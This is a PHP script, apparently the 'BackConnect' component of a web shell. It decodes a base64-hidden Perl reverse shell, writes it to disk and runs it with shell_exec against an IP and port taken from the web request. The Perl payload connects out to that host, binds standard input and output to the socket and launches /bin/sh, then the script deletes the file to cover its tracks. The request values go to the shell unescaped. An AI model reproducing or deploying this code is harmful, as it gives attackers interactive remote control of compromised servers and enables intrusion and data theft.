<?php
$IP = @$_REQUEST['IP_TextBox'];
$Port = @$_REQUEST['Port_TextBox'];
#===========================Create BackConnect===========================#
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRob3N0ID0gJEFSR1ZbMF07CiRw
b3J0ID0gJEFSR1ZbMV07CiAgICBpZiAoISRBUkdWWzBdKSB7CiAgcHJpbnRmICJb
IV0gVXNhZ2U6IHBlcmwgZGMucGwgPEhvc3Q+IDxQb3J0PlxuIjsKICBleGl0KDEp
Owp9CnByaW50ICJbK10gQ29ubmVjdGluZyB0byAkaG9zdFxuIjsKJHByb3QgPSBn
ZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNP
Q0tfU1RSRUFNLCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0
ICEiKTsKaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBv
cnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGllKCJbLV0gVW5hYmxlIHRvIENvbm5l
Y3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwogIG9wZW4oU1RET1VU
LCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwpleGVjIHsn
L2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDs=");
$fpS = @fopen("dc.pl",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
	echo "<PRE>";
	echo @shell_exec("perl dc.pl $IP $Port");
	echo "</PRE>";
	@unlink("dc.pl");
}

?>